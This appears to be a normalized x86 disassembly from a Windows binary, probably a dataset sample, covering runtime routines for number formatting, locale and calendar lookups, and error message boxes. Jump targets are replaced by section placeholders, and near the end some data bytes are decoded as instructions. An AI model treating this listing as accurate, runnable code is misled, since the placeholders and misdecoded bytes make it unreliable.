test [ ebx + 0x4 ] 0x80000000
je sub_446d13
cmp cl 0x55
je sub_446d13
xor eax eax
lea ebx [ ebp - 0x30 ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
cmp cl 0x44
je r-xdata
cmp cl 0x44
je r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_44ccc8
jmp r-xdata
mov esi sub_44cd28
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
neg [ ebx ]
adc [ ebx + 0x4 ] 0x0
neg [ ebx + 0x4 ]
call sub_446d13
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
cmp cl 0x58
jne r-xdata
or eax eax
jns sub_446d9a
cmp cl 0x55
je sub_446d9a
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x10 ]
call esi
mov esi [ ebp - 0x10 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x20 ]
jecxz r-xdata
mov [ ebp - 0x20 ] 0x8
mov ecx 0x10
jmp r-xdata
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x20 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0x10
jmp r-xdata
neg eax
call sub_446d9a
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
cmp cl 0x58
jne r-xdata
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0xc ]
call sub_446af8
mov esi [ ebp - 0xc ]
jmp r-xdata
cmp ecx [ ebp - 0x20 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
lea esi [ ebp - 0x61 ]
push ebx
push eax
push edx
lea eax [ ebp - 0x71 ]
mov edx esi
movzx ecx bh
call sub_444ca2
mov ecx eax
lea esi [ ebp - 0x71 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
lea esi [ ebp - 0x51 ]
mov ecx 0x10
jmp r-xdata
mov ecx [ ebp - 0x20 ]
retn
retn
dec edi
dec esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
mov eax 0x12
mov edx [ ebp - 0x20 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
dec esi
mov [ esi ] dl
push ecx
push 0x0
push ecx
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
call sub_44a3b4
pop ecx
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
or eax edx
jne r-xdata
add dl 0x7
xor edx edx
div ecx
add dl 0x30
cmp dl 0x3a
jb r-xdata
lea ecx [ ebp - 0x61 ]
sub ecx esi
mov edx [ ebp - 0x20 ]
cmp edx 0x10
jbe r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
push ecx
push 0x0
push ecx
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
call sub_44a4a9
pop ecx
xchg edx eax
add dl 0x30
cmp dl 0x3a
jb r-xdata
lea ecx [ ebp - 0x51 ]
sub ecx esi
mov edx [ ebp - 0x20 ]
cmp edx 0x10
jbe r-xdata
sub edx ecx
jbe r-xdata
retn
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub edx ecx
jbe r-xdata
retn
retn
add ecx edx
mov al 0x30
retn
add ecx edx
mov al 0x30
dec esi
mov [ esi ] al
dec edx
jne r-xdata
dec esi
mov [ esi ] al
dec edx
jne r-xdata
sub_446d13
mov ecx 0xa
lea esi [ ebp - 0x51 ]
dec esi
mov [ esi ] dl
push ecx
push 0x0
push ecx
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
call sub_44a3b4
pop ecx
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
or eax edx
jne r-xdata
add dl 0x7
push ecx
push 0x0
push ecx
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
call sub_44a4a9
pop ecx
xchg edx eax
add dl 0x30
cmp dl 0x3a
jb r-xdata
lea ecx [ ebp - 0x51 ]
sub ecx esi
mov edx [ ebp - 0x20 ]
cmp edx 0x10
jbe r-xdata
sub edx ecx
jbe r-xdata
retn
retn
add ecx edx
mov al 0x30
dec esi
mov [ esi ] al
dec edx
jne r-xdata
sub_446d9a
mov ecx 0xa
lea esi [ ebp - 0x61 ]
dec esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
add dl 0x30
cmp dl 0x3a
jb r-xdata
lea ecx [ ebp - 0x61 ]
sub ecx esi
mov edx [ ebp - 0x20 ]
cmp edx 0x10
jbe r-xdata
sub edx ecx
jbe r-xdata
retn
retn
add ecx edx
mov al 0x30
dec esi
mov [ esi ] al
dec edx
jne r-xdata
sub_446f20
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_4467d0
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edx 0x7fffffff
call sub_446b28
mov edx [ ebp - 0x4 ]
mov [ edx + eax ] 0x0
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn 0x4
sub_446f68
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
call sub_4467d0
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_446b28
mov edx [ ebp - 0x4 ]
mov [ edx + eax ] 0x0
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn 0x8
sub_446fac
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_446fd4
mov esp ebp
pop ebp
retn 0x4
sub_446fd4
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] 0x1002
mov eax [ ebp - 0x8 ]
call sub_44cd60
mov edx [ ebp - 0x14 ]
test edx edx
jns r-xdata
sar edx 0x2
mov ecx [ ebp - 0x14 ]
sub ecx edx
cmp eax ecx
jge r-xdata
add edx 0x3
mov eax [ ebp - 0x8 ]
call sub_44cd60
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
call sub_44cd60
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
dec edx
lea eax [ ebp - 0x1016 ]
call sub_446b28
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea edx [ ebp - 0x1016 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_44cbc8
jmp r-xdata
mov eax [ ebp - 0x14 ]
dec eax
cmp eax [ ebp - 0x10 ]
jg r-xdata
mov eax [ ebp - 0x14 ]
dec eax
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ ebp - 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
call sub_44cae0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_44d04c
mov eax [ ebp - 0x8 ]
call sub_44cd60
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_446b28
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_44d04c
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_4470c0
push ebp
mov ebp esp
add esp 0xfffffef4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
push 0x100
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x3000
call FormatMessageA
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea edx [ ebp - 0x10c ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
call sub_44cbc8
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov al [ ebp + eax - 0x10d ]
sub al 0x21
jb r-xdata
dec [ ebp - 0xc ]
sub al 0xd
je r-xdata
sub_447124
push ebp
mov ebp esp
add esp 0xfffffef0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x100
lea eax [ ebp - 0x110 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetLocaleInfoA
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44cb34
mov ecx [ ebp - 0x10 ]
dec ecx
lea edx [ ebp - 0x110 ]
mov eax [ ebp + 0x8 ]
call sub_44cbc8
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_447180
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov al [ ebp - 0x9 ]
mov [ ebp - 0xa ] al
mov al [ ebp - 0xc ]
mov [ ebp - 0xa ] al
jmp r-xdata
mov al [ ebp - 0xa ]
mov esp ebp
pop ebp
retn
sub_4471bc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_447124
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ eax + edx * 4 ]
mov edx [ ebp + 0x8 ]
call sub_44e378
sub_447200
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_447328
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x1
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx [ ebp - 0x8 ]
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x44
dec eax
call sub_4471bc
pop ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
lea eax [ eax * 4 + rw-data ]
call sub_44cb34
push ebp
push 0xb
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx [ ebp - 0x8 ]
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x38
dec eax
call sub_4471bc
pop ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
lea eax [ eax * 4 + rw-data ]
call sub_44cb34
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xd
jne r-xdata
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp - 0x8 ]
add eax 0x5
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0xc ] edx
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx [ ebp - 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
add eax 0x31
call sub_4471bc
pop ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
lea eax [ eax * 4 + rw-data ]
call sub_44cb34
push ebp
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov ecx rw-data
mov edx [ ebp - 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
add eax 0x2a
call sub_4471bc
pop ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
lea eax [ eax * 4 + rw-data ]
call sub_44cb34
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44732f
lea eax [ ebp - 0x1c ]
mov edx 0x4
call sub_44cb04
retn
sub_447334
push ebp
mov ebp esp
add esp 0xfffffff8
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax * 4 + rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x7
je r-xdata
mov eax [ ebp - 0x8 ]
lea eax [ eax * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_44cc98
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x4
inc [ ebp - 0x8 ]
sub_447380
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4473f9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x7
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
call sub_44cc98
mov eax [ ebp - 0xc ]
xor edx edx
call sub_446490
mov edx [ ebp - 0x8 ]
mov [ edx * 4 + rw-data ] eax
mov [ ebp - 0x4 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447400
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
inc [ ebp - 0x8 ]
sub_44740c
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4474b8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_447124
mov eax [ ebp - 0xc ]
mov edx 0x1
call sub_446490
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4474bf
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
push 0x4
mov eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
push eax
push sub_447334
call EnumCalendarInfoA
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax * 4 + rw-data ] 0xffffffff
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x8
jne r-xdata
push 0x3
mov eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
push eax
push sub_447380
call EnumCalendarInfoA
sub_4474d0
push ebp
mov ebp esp
add esp 0xffffffdc
xor ecx ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44770b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov eax [ ebp - 0x8 ]
call sub_44cae0
lea eax [ ebp - 0x18 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_447124
mov eax [ ebp - 0x18 ]
mov edx 0x1
call sub_446490
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cd60
cmp eax [ ebp - 0xc ]
jge r-xdata
mov ax [ rw-data ]
sub ax 0x4
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov al [ edx + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447712
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_44cb04
retn
mov al 0x1
add eax 0xfffffff3
sub ax 0x2
jb r-xdata
mov edx r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ ecx + eax - 0x1 ]
mov ecx 0x2
call sub_44691c
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov ecx 0x2
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44cf68
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
call sub_44cd68
mov eax [ ebp - 0x8 ]
add [ ebp - 0xc ] 0x2
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_44cb34
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ ecx + eax - 0x1 ]
mov ecx 0x4
call sub_44691c
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_44cd68
mov eax [ ebp - 0x8 ]
inc [ ebp - 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cd60
cmp eax [ ebp - 0xc ]
jge r-xdata
mov [ ebp - 0x11 ] al
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ ecx + eax - 0x1 ]
mov ecx 0x2
call sub_44691c
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_44cd68
mov eax [ ebp - 0x8 ]
add [ ebp - 0xc ] 0x3
jmp r-xdata
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov al [ edx + eax - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov al [ edx + eax - 0x1 ]
sub al 0x59
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_44cd68
mov eax [ ebp - 0x8 ]
inc [ ebp - 0xc ]
jmp r-xdata
inc [ ebp - 0xc ]
sub al 0x20
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_44cd68
mov eax [ ebp - 0x8 ]
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov dl [ ecx + edx - 0x1 ]
call sub_44cc88
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_44cd68
mov eax [ ebp - 0x8 ]
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov dl [ ecx + edx - 0x1 ]
call sub_44cc88
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_44cd68
mov eax [ ebp - 0x8 ]
sub_447768
push ebp
mov ebp esp
push ecx
call sub_44bb44
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_44bb44
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn
sub_447790
push ebp
mov ebp esp
push ecx
call sub_44bb44
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_44bb44
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn
sub_4477c4
push ebp
mov ebp esp
add esp 0xfffffb90
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x1c
lea eax [ ebp - 0x348 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call VirtualQuery
cmp [ ebp - 0x338 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x22a ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax [ ebp - 0x8 ]
call sub_4477b8
mov [ ebp - 0x20 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x22a ]
push eax
mov eax [ ebp - 0x344 ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x22a ]
mov dl 0x5c
call sub_4486ec
mov edx eax
inc edx
lea eax [ ebp - 0x125 ]
mov ecx 0x104
call sub_446860
mov eax r-xdata
mov [ ebp - 0x14 ] eax
mov eax r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x344 ]
mov [ ebp - 0x20 ] eax
push 0x100
lea eax [ ebp - 0x32a ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_44de30
push eax
call LoadStringA
lea edx [ ebp - 0x470 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44bfbc
lea eax [ ebp - 0x470 ]
mov [ ebp - 0x370 ] eax
mov [ ebp - 0x36c ] 0x4
lea eax [ ebp - 0x125 ]
mov [ ebp - 0x368 ] eax
mov [ ebp - 0x364 ] 0x6
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x360 ] eax
mov [ ebp - 0x35c ] 0x5
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x6
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
lea eax [ ebp - 0x370 ]
push eax
push 0x4
lea ecx [ ebp - 0x32a ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
call sub_446f68
mov eax [ ebp - 0xc ]
call sub_4467d0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44cf24
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_4467d0
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
cmp [ edx + eax - 0x1 ] 0x2e
je r-xdata
mov eax r-xdata
mov [ ebp - 0x18 ] eax
sub_447978
push ebp
mov ebp esp
add esp 0xfffffbb8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x400
lea ecx [ ebp - 0x448 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4477c4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ ebp - 0x48 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_44de30
push eax
call LoadStringA
push 0x2010
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x448 ]
push eax
push 0x0
call MessageBoxA
lea edx [ ebp - 0x448 ]
mov eax [ rw-data ]
call j_sub_449d20
call sub_449c9f
call sub_44bb94
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_447a00
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x4
mov edx [ ebp - 0xc ]
call sub_44cb34
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_447a48
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447aad
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
call sub_446fac
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
add eax 0x4
call sub_44cb34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447ab4
lea eax [ ebp - 0x10 ]
call sub_44cae0
retn
add esp 0xfffffff0
call sub_44c370
sub_447ad8
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x4 ]
mov eax [ ebp - 0xc ]
call sub_44e378
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_447b20
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447b98
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44e378
mov eax [ ebp - 0x14 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_446fac
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
add eax 0x4
call sub_44cb34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447b9f
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_44cb04
retn
add esp 0xfffffff0
call sub_44c370
sub_447c00
push ebp
mov ebp esp
add esp 0xffffffec
xor eax eax
mov [ ebp - 0x8 ] eax
call sub_44bbd0
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x6
jg r-xdata
cmp [ ebp - 0x8 ] 0x6
jg r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax * 8 + rw-data ]
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447b20
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
mov [ ebp - 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_447c84
mov [ esp + eax * 2 ] bh
push cs
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
xchg ebp eax
inc esp
add [ eax + eax ] al
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
dec eax
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec eax
je r-xdata
push [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
jmp sub_44c7a8
mov eax [ rw-data ]
